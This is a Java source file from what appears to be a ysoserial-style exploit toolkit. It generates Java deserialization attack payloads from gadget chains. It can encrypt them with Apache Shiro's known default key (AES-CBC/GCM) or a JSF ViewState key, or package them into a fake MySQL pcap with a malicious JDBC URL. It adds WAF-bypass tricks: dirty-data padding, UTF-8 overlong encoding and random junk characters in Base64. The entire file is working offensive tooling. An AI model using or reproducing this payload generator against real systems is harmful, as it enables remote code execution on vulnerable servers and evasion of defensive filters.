package cn.butler.yso.config;

import cn.butler.payloads.ObjectPayload;
import cn.butler.utils.FileUtils;
import cn.butler.yso.Serializer;
import cn.butler.yso.UTF8BytesMix;
import cn.butler.payloads.config.Config;
import cn.butler.yso.payloads.util.DirtyDataWrapper;
import cn.butler.yso.utils.FakeMySQLPcapFile;
import cn.butler.yso.utils.YsoUtils;
import org.apache.commons.cli.CommandLine;
import org.apache.shiro.lang.codec.Base64;
import org.apache.commons.codec.binary.Hex;
import org.apache.shiro.Encrypt.CbcEncrypt;
import org.apache.shiro.Encrypt.ShiroGCM;

import javax.crypto.spec.SecretKeySpec;
import javax.xml.bind.DatatypeConverter;
import java.util.*;

import static cn.butler.GeneratePayload.ysoConfig;

public class YsoConfig extends Config {
    private boolean isCompress = false;

    public boolean isCompress() {
        return isCompress;
    }

    public void setCompress(boolean compress) {
        isCompress = compress;
    }

    public void parse(CommandLine cmdLine){

        if(cmdLine.hasOption("compress")){
            ysoConfig.setCompress(true);
        }else{
            ysoConfig.setCompress(false);
        }

        final String payloadType = cmdLine.getOptionValue("gadget");
        final String command = cmdLine.getOptionValue("args");
        byte[] serialize = null;

        //没有gadgets则返回使用方式,PrincipalCollectionShiroKeyTest利用链不需要参数
        if(payloadType == null){
            System.exit(USAGE_CODE);
            return; // make null analysis happy
        }

        //如果需要构造的gadget为null，则返回报错
        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("YsoAttack",payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            System.exit(USAGE_CODE);
            return; // make null analysis happy
        }

        try {
            ObjectPayload payload = payloadClass.newInstance();
            Object object = payload.getObject(command);

            if(cmdLine.hasOption("dirt-data-length")){
                int dirtDataLength = Integer.valueOf(cmdLine.getOptionValue("dirt-data-length"));
                DirtyDataWrapper dirtyDataWrapper = new DirtyDataWrapper(object,dirtDataLength);
                object = dirtyDataWrapper.doWrap();
            }

            //判断是否需要Shiro加密
            if(cmdLine.hasOption("shiro-encrypt-pattern")){
                serialize = Serializer.serialize(object);
                String shirokey = "kPH+bIxk5D2deZiIxcaaaA==";
                final String encryptPattern = cmdLine.getOptionValue("shiro-encrypt-pattern");
                if(cmdLine.hasOption("shiro-key")){
                    shirokey = cmdLine.getOptionValue("shiro-key");
                }
                String encryptPayload = null;
                if(encryptPattern != null && encryptPattern.equals("AES-GCM")){
                    //AES-GCM,Base64
                    ShiroGCM shiroGCM = new ShiroGCM();
                    encryptPayload = shiroGCM.encrypt(shirokey,serialize);
                }else {
                    //AES-CBC,Base64
                    CbcEncrypt cbcEncrypt = new CbcEncrypt();
                    encryptPayload = cbcEncrypt.encrypt(shirokey,serialize);
                }
                //是否需要Shiro形式的Base64混淆
                if(cmdLine.hasOption("shiro-base64WafBypass")){
                    int number = Integer.valueOf(cmdLine.getOptionValue("shiro-base64WafBypass"));
                    encryptPayload = shiroBase64ByPassWaf(encryptPayload,number);
                }
                if (cmdLine.hasOption("writeToFile")){
                    String fileName = cmdLine.getOptionValue("writeToFile");
                    FileUtils.savePayloadToFile(encryptPayload,fileName);
                    System.exit(0);
                }
                System.out.println(encryptPayload);
                System.exit(0);
            }

            //判断是否需要JSF Faces的加密
            if(cmdLine.hasOption("jsf-key")){
                //JSF Faces首先需要GZIP序列化
                byte[] serialBytes = Serializer.serializeWithGzip(object);
                //其次进行AES HmacSHA256加密(JSF2.2之后序列化数据需要进行AES加密)
                String jsfEncryptKey = cmdLine.getOptionValue("jsf-key");
                if (!jsfEncryptKey.equals("none")) {
                    //手搓的JSF加密
                    byte[] keyArray = DatatypeConverter.parseBase64Binary(jsfEncryptKey);
                    SecretKeySpec secretKeySpec = new SecretKeySpec(keyArray, "AES");
                    YsoUtils ysoUtils = new YsoUtils();
                    ysoUtils.setSk(secretKeySpec);
                    serialBytes = ysoUtils.jsfFacesEncrypt(serialBytes);
//                    ByteArrayGuard byteArrayGuard = new ByteArrayGuard();
//                    serialBytes = byteArrayGuard.encrypt(serialBytes);
                }
                //最后进行Base64加密
                String base64String = Base64.encodeToString(serialBytes);
                System.out.println(base64String);
                System.exit(0);
            }

            if(cmdLine.hasOption("mysql-pcap")){
                String version = cmdLine.getOptionValue("mysql-pcap");
                serialize = Serializer.serialize(object);
                //生成恶意数据流
                FakeMySQLPcapFile fakeMySQLPcapFile = new FakeMySQLPcapFile(version);
                byte[] evilPcap = fakeMySQLPcapFile.makePcap(serialize);
                //输出处理
                if (cmdLine.hasOption("writeToFile")){
                    String fileName = cmdLine.getOptionValue("writeToFile");
                    System.out.println(fakeMySQLPcapFile.jdbc_url.replace("{filePath}",fileName));
                    FileUtils.saveBytePayloadToFile(evilPcap,fileName);
                    System.exit(0);
                }
                System.out.println(fakeMySQLPcapFile.jdbc_url);
                System.out.write(evilPcap,0,serialize.length);
                System.exit(0);
            }

            // 普通对象序列化 or Gzip对象序列化选择
            if(serialize == null && cmdLine.hasOption("gzip")){
                serialize = Serializer.serializeWithGzip(object);
            }else if(serialize == null) {
                serialize = Serializer.serialize(object);
            }

            // UTF8-OverLong-Encoding绕WAF
            if(cmdLine.hasOption("utf8-bytes-mix")){
                int type = Integer.valueOf(cmdLine.getOptionValue("utf8-bytes-mix"));
                if(type == 2){
                    UTF8BytesMix.type = 2;
                }else {
                    UTF8BytesMix.type = 3;
                }
                serialize = new UTF8BytesMix(serialize).builder();
            }

            //序列化外包装处理: 编码/写入文件
            if(cmdLine.hasOption("encode")){
                String encodeResult = "Currently only supports Base64 and Hex encoding";
                String encodeType = cmdLine.getOptionValue("encode");
                if(encodeType.equals("Base64")){
                    encodeResult = Base64.encodeToString(serialize);
                } else if (encodeType.equals("Base64URL")) {
                    encodeResult = java.util.Base64.getUrlEncoder().withoutPadding().encodeToString(serialize);
                } else if (encodeType.equals("Hex")) {
                    encodeResult = Hex.encodeHexString(serialize).toUpperCase();
                }
                if (cmdLine.hasOption("writeToFile")){
                    String fileName = cmdLine.getOptionValue("writeToFile");
                    FileUtils.savePayloadToFile(encodeResult,fileName);
                    System.exit(0);
                }
                System.out.println(encodeResult);
                System.exit(0);
            }
            if (cmdLine.hasOption("writeToFile")){
                String fileName = cmdLine.getOptionValue("writeToFile");
                FileUtils.saveBytePayloadToFile(serialize,fileName);
                System.exit(0);
            }
            //原版的输出
//            PrintStream out = System.out;
//            Serializer.serialize(object, out);
            System.out.write(serialize,0,serialize.length);
            ObjectPayload.Utils.releasePayload(payload, object);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(INTERNAL_ERROR_CODE);
        }
        System.exit(0);
    }

    private static String shiroBase64ByPassWaf(String encryptPayload,int number){
        //垃圾字符
        char[] CHARACTERS = {'$','#','&','!','%','*','-','.'};
        if (encryptPayload == null || encryptPayload.isEmpty() || number <= 0) {
            return encryptPayload; // 无效输入，直接返回原字符串
        }
        Random random = new Random();
        StringBuilder result = new StringBuilder(encryptPayload);
        for (int i = 0; i < number; i++) {
            // 随机选择一个字符
            char randomChar = CHARACTERS[random.nextInt(CHARACTERS.length)];
            // 随机选择一个插入位置
            int randomPosition = random.nextInt(result.length() + 1); // 包括尾部位置
            // 插入字符
            result.insert(randomPosition, randomChar);
        }
        return result.toString();
    }
}
